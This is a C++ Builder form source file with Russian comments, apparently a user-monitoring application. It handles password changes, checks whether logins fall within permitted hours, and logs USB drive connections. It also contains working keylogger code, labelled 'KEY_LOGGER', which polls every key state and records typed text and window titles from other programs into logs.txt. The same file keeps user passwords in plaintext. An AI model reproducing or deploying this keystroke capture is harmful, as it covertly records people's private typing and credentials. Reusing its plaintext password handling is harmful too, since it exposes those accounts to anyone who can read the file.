//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop

#include "Unit4.h"
#include "Unit1.h"
#include "Unit5.h"
#include "Unit2.h"
#include <Dbt.h>

#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <jpeg.hpp>
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm4 *Form4;
//---------------------------------------------------------------------------
__fastcall TForm4::TForm4(TComponent* Owner)
	: TForm(Owner)
{
// Страница юзера
ModalResult = mrOk;
Form2->Memo3->Lines->Clear();


}
 //---------------------------------------------------------------------------

 using namespace std;

void LOG(string input) {
	fstream LogFile;
	LogFile.open("logs.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}


bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		cout << " ";
		LOG(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		LOG("\n");
		return true;
	case '¾':
		cout << ".";
		LOG(".");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		LOG("#SHIFT#");
		return true;
	case VK_BACK:
		cout << "\b";
		LOG("\b");
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		LOG("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		LOG("#CAPS_LCOK");
		return true;
	case VK_TAB:
		cout << "#TAB";
		LOG("#TAB");
		return true;
	case VK_UP:
		cout << "#UP";
		LOG("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		LOG("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		LOG("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		LOG("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		cout << "#CONTROL";
		LOG("#CONTROL");
		return true;
	case VK_MENU:
		cout << "#ALT";
		LOG("#ALT");
		return true;
	default:
		return false;
	}
}


void __fastcall TForm4::Button1Click(TObject *Sender)
{
//ShowMessage(Form1->Edit1->Text); логин юзера
String S,S1,S2,S3,S4,S5=Form1->Edit1->Text,S6,SS;
int a=0,b,c=0,d=0;
TStringList *file= new TStringList;//массив элементов где каждый элемент - строка
file->LoadFromFile("ppl.txt"); // Загружаем файл

for(int i=0;i<file->Count;i++)//берем строку
{
S=file->Strings[i];
S6=S5;
S2=S;
S5="]"+S5+";";            //получение нужным нам данных с помощью подстрок
b=S.Pos(S5)+S5.Length()-1;
S1=S.SubString(a,b);//Всё что до пароля юзера
SS=S1.SubString(b-S5.Length()-2,4);
S1=S1.SubString(a,b-3-S5.Length());//всё что до юзера
S2=S.SubString(b+1,S.Length());
S3=S2.SubString(0,S2.Pos(";")-1);// пароль юзера
c=b+S2.Pos(";");
S2=S.SubString(c,S.Length()); //Всё что после пароля юзера
if (SS=="[02]" and Form2->CheckBox2->Checked==1)      // проверка на первый вход
{
if(CompareStr(Edit1->Text,S3)==0)                      //проверка правильности старого пароля
{
  if(CompareStr(Edit2->Text,Edit1->Text)==0)           //проверка на отличие нового пароля от старого
  {
	   ShowMessage("Новый пароль должен отличаться от старого!");
  }
  else
  {
	   if(CompareStr(Edit2->Text,Edit3->Text)==0 and CompareStr(Edit2->Text,"")!=0 ) //проверка на правильность введёного пароля
   {
	   S=S1+"[01]"+S6+";"+Edit2->Text+S2;
	   file->Strings[i]=S;
	   file->SaveToFile("ppl.txt");             //если всё верно, то сохраняем в файл
	   ShowMessage("Пароль успешно изменён!");
   }
   else if (CompareStr(Edit2->Text,"")==0)   //проверка на пустой пароль
   {
	 ShowMessage("Пароль не может быть пустым");
   }
   else
   {
	   ShowMessage("Проверьте правильность введения нового пароля!");
   }
  }
}
else
ShowMessage("Старый пароль введён непрвильно");
}
else if (Form2->CheckBox2->Checked==0)
{
 if(CompareStr(Edit2->Text,Edit1->Text)==0)
  {
	   ShowMessage("Новый пароль должен отличаться от старого!");
  }
  else
  {
	   if(CompareStr(Edit2->Text,Edit3->Text)==0 and CompareStr(Edit2->Text,"")!=0 )
   {
	   S=S1+"[01]"+S6+";"+Edit2->Text+S2;
	   file->Strings[i]=S;
	   file->SaveToFile("ppl.txt");
	   ShowMessage("Пароль успешно изменён!");
   }
   else if (CompareStr(Edit2->Text,"")==0)
   {
	 ShowMessage("Пароль не может быть пустым");
   }
   else
   {
	   ShowMessage("Проверьте правильность введения нового пароля!");
   }
  }
}
else
{
  ShowMessage("Вы недавно меняли пароль, вы сможете сменить его при следующем входе.");
  break;
}
}
}
//---------------------------------------------------------------------------

void __fastcall TForm4::Button2Click(TObject *Sender)  //ON_ACTIVATE
{

Timer2->Enabled=true;
String S,S1,S2,S3,S4,S5=Form1->Edit1->Text,S6,SS;
int a=0,b,c=0,d=0;
TStringList *file= new TStringList;//массив элементов где каждый элемент - строка
file->LoadFromFile("pics.txt"); // Загружаем файл
for(int i=0;i<file->Count;i++)//берем строку
{
S=file->Strings[i];
S2=S;
S6=S5;
S5="]"+S5+";";
b=S.Pos(S5)+S5.Length()-1;
S1=S.SubString(a,b);//Всё что до авы юзера
SS=S1.SubString(b-S5.Length()-2,4);
S1=S.SubString(a,b-5-S6.Length());
S2=S.SubString(b+1,S.Length());
S3=S2.SubString(0,S2.Pos(";")-1);// ава юзера
//ShowMessage(S3);
}

Image1->Picture->LoadFromFile("pics\\"+S3+".jpg");


TStringList *file2= new TStringList;//массив элементов где каждый элемент - строка
file2->LoadFromFile("time.txt"); // Загружаем файл
 a=0,b,c=0,d=0;
S5=Form1->Edit1->Text;
for(int i=0;i<file2->Count;i++)//берем строку
{
S=file2->Strings[i];
S2=S;
S6=S5;
S5="]"+S5+";";
b=S.Pos(S5)+S5.Length()-1;
S1=S.SubString(a,b);//Всё что времени юзера
SS=S1.SubString(b-S5.Length()-2,4);
S1=S.SubString(a,b-5-S6.Length());
S2=S.SubString(b+1,S.Length());
S3=S2.SubString(0,S2.Pos(";")-1);// время юзера, в которое ему можно заходить
//ShowMessage(S3);
}

TDateTime df,time1,time2;
String f_time,second_time;
f_time=S3.SubString(0,S3.Pos("-")-1);

second_time=S3.SubString(S3.Pos("-")+1,S3.Length()-1-f_time.Length());

AnsiString ss = FormatDateTime("h:mm",df.CurrentDateTime());
df= FormatDateTime("h:mm",df.CurrentDateTime());

time1=FormatDateTime("h:mm",f_time); //первое время
time2=FormatDateTime("h:mm",second_time); //второе время

if(time1>df)
Form2->Memo3->Lines->Add(ss+" "+Form1->Edit1->Text+" вход в неположенное время");//уведомление админа о входе в неположенное время
else if(df>time2)
Form2->Memo3->Lines->Add(ss+" "+Form1->Edit1->Text+" вход в неположенное время");//уведомление админа о входе в неположенное время

int opozdania=0;
String Line;
for(int i=0;i<Form2->Memo3->Lines->Count;i++)  //подсчёт количества входов этого пользователя в неположенное время
{
Line=Form2->Memo3->Lines->Strings[i];
if(Line.Pos(Form1->Edit1->Text)>0)
opozdania++;
}
if(opozdania>0) //уведомление пользователя о входе в неположенное время
{
ShowMessage("Уважаемый пользователь!\nВаше количество опозданий =  "+(String)opozdania+"\nПрекратите заходить в неположенное время.\nНачальство будет уведомлено.");
}
opozdania=0;
}
//---------------------------------------------------------------------------



void __fastcall TForm4::FormClose(TObject *Sender, TCloseAction &Action)
{
first_time=true;
String S,S1,S2,S3,S4,S5=Form1->Edit1->Text,S6,SS;
int a=0,b,c=0,d=0;
TStringList *file= new TStringList;//массив элементов где каждый элемент - строка
file->LoadFromFile("ppl.txt"); // Загружаем файл
for(int i=0;i<file->Count;i++)//берем строку
{
S=file->Strings[i];
S2=S;
S6=S5;
S5="]"+S5+";";
b=S.Pos(S5)+S5.Length()-1;
S1=S.SubString(a,b);//Всё что до пароля юзера
SS=S1.SubString(b-S5.Length()-2,4);
S1=S.SubString(a,b-5-S6.Length());
S2=S.SubString(b+1,S.Length());
S3=S2.SubString(0,S2.Pos(";")-1);// пароль юзера
c=b+S2.Pos(";");
S2=S.SubString(c,S.Length()); //Всё что после пароля юзера
if (SS=="[01]")
{
  S=S1+"[02]"+S6+";"+S3+S2;
  file->Strings[i]=S;
  file->SaveToFile("ppl.txt");
}
}
}
//---------------------------------------------------------------------------
void __fastcall TForm4::FWM_DEVICECHANGE(TMessage &Message)
{
        static DWORD old_drives = GetLogicalDrives();

		int new_drives = GetLogicalDrives();
		int drive = 0, count = 0;
		String sDrive = "A:";
		String S,S1,S2,S3,S4,S5=Form1->Edit1->Text,S6,SS;
int a=0,b,c=0,d=0;
TStringList *file= new TStringList;//массив элементов где каждый элемент - строка
file->LoadFromFile("drives.txt"); // Загружаем файл
for(int i=0;i<file->Count;i++)//берем строку
{
S=file->Strings[i];
S2=S;
S6=S5;
S5="]"+S5+";";
b=S.Pos(S5)+S5.Length()-1;
S1=S.SubString(a,b);//Всё что до диска юзера
SS=S1.SubString(b-S5.Length()-2,4);
S1=S.SubString(a,b-5-S6.Length());
S2=S.SubString(b+1,S.Length());
S3=S2.SubString(0,S2.Pos(";")-1);// диск юзера, которым ему можно пользоваться


		if (Message.WParam == DBT_DEVICEARRIVAL)  //подключение флеш накопителя
        {
                // определяем букву
                drive = new_drives-old_drives;
				while (drive) { drive >>= 1; count++; }
				sDrive[1] += count-1;
				// тип устройства
                if (GetDriveType(sDrive.c_str()) != DRIVE_REMOVABLE) return;

				// выводим в журнал админа, если пользователю нельзя пользоваться данным устройством
				if(CompareStr(sDrive,S3)!=0)
				Form2->Memo3->Lines->Add(Form1->Edit1->Text + " подключил: " + sDrive);

				// запоминаем
				old_drives = new_drives;
		}
		else if (Message.WParam == DBT_DEVICEREMOVECOMPLETE) //отключение флеш накопителя
		{
				// определяем букву
				drive = old_drives-new_drives;
				while (drive) { drive >>= 1; count++; }
				sDrive[1] += count-1;

				// выводим в журнал админа, если пользователю нельзя пользоваться данным устройством

					if(CompareStr(sDrive,S3)!=0)
				Form2->Memo3->Lines->Add(Form1->Edit1->Text + " отключил: " + sDrive);

				// запоминаем
				old_drives = new_drives;
		}
}

}


void __fastcall TForm4::Timer2Timer(TObject *Sender)
{
Timer2->Enabled=false;
Timer1->Enabled=true;
//Memo1->Lines->Add("POSHLO DOBRO");
hern=1;
}
//---------------------------------------------------------------------------

int __fastcall ChangeLayout(char s)
{
	int temp = int(s);
	switch(temp)
	{
		case 65:temp=212;
				break;
		case 66:temp=200;
				break;
		case 67:temp=209;
				break;
		case 68:temp=194;
				break;
		case 69:temp=211;
				break;
		case 70:temp=192;
				break;
		case 71:temp=207;
				break;
		case 72:temp=208;
				break;
		case 73:temp=216;
				break;
		case 74:temp=206;
				break;
		case 75:temp=203;
				break;
		case 76:temp=196;
				break;
		case 77:temp=220;
				break;
		case 78:temp=210;
				break;
		case 79:temp=217;
				break;
		case 80:temp=199;
				break;
		case 81:temp=201;
				break;
		case 82:temp=202;
				break;
		case 83:temp=219;
				break;
		case 84:temp=197;
				break;
		case 85:temp=195;
				break;
		case 86:temp=204;
				break;
		case 87:temp=214;
				break;
		case 88:temp=215;
				break;
		case 89:temp=205;
				break;
		case 90:temp=223;
				break;
		case 91:temp=213;
				break;
	   //	case 221:temp=218;//Ъ  не робит
		 //		break;
		case 186:temp=198;//Ж
				break;
		case 221:temp=221;//' Э
				break;
		case 188:temp=193;//,Б  не робит
				break;
		case 222:temp=222;//.Ю
				break;
	   //	case 192:temp=184;//`Ё пишет букву А
			   //	break;
	}
     //для такого есть специальная функция, но о ней я узнал уже после этого безобразия =)
	return temp;
}


void __fastcall TForm4::Button3Click(TObject *Sender)
{
 String p="";
// setlocale(LC_ALL,"Russian");
if (first_time==true)
{
  p="---------------------USER:"+Form1->Edit1->Text +"---------------------";
}
  bool okno_pr=true;
 int pp=p.Length();
//char chel[]=Form1->Edit1->Text;
char *p_darr = new char[pp+1]; // Выделение памяти для массива
	p_darr[0]='\n';
	for (int i = 1; i < pp; i++) {
		// Заполнение массива и вывод значений его элементов
		p_darr[i] = p[i];
	}
//ShowMessage(p_darr);

//KEY_LOGGER
  if(Timer2->Enabled==false and hern==1){
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	bool keyboard;
HKL descr = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0));
keyboard = (descr == reinterpret_cast<HKL>(0x04090409));
//ShowMessage(keyboard); 0-RUS 1-ENG

Timer1->Enabled=false;
HWND curhwnd = GetForegroundWindow();
HWND lasthwnd=curhwnd;
char wnd_title[256];
int a=1;
if(curhwnd == lasthwnd)
{
	char KEY = 'x';
	while (curhwnd == lasthwnd)
	{
		descr = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0));
		keyboard = (descr == reinterpret_cast<HKL>(0x04090409));
		GetWindowTextA(curhwnd, wnd_title, sizeof(wnd_title));  //название окна
		if (CompareStr(wnd_title,"TForm1")==0 or CompareStr(wnd_title,"Form4")==0 or CompareStr(wnd_title,"TForm2")==0  or CompareStr(wnd_title,"Form3")==0 or CompareStr(wnd_title,"Form5")==0 or CompareStr(wnd_title,"Project1")==0)
		{
		 //
		 goto skip;
		}
		else
		{
        okno_pr=false;
		Sleep(5);
		for (int KEY = 8; KEY <= 255; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {

					fstream LogFile;
					LogFile.open("logs.txt", fstream::app);  //открытие файла  на дополнение

					if (LogFile.is_open()) {
						if (a==1) {//first_time==false
						 if(first_time==true)
						 {
						  LogFile << p_darr; //вывод логина пользователя
						  first_time=false;
						  delete [] p_darr; // очистка памяти
						 }
						 LogFile <<"\nОкно: "<< wnd_title<<"\n";  //вывод окна
						 a=0;
						}
						if (keyboard==1) {

						 LogFile << char(KEY);//вывод английсого текста
						}
						else{
						setlocale(LC_ALL,".1251");
						LogFile <<(char)ChangeLayout(KEY);//вывод русского текста
						}
						LogFile.close();//закрытия файла
					}

				}
			}
		}

		}
	  curhwnd = GetForegroundWindow();
	}
	a=1;
	lasthwnd=curhwnd;
}
skip:
 Timer1->Enabled=true;

}

}
//---------------------------------------------------------------------------

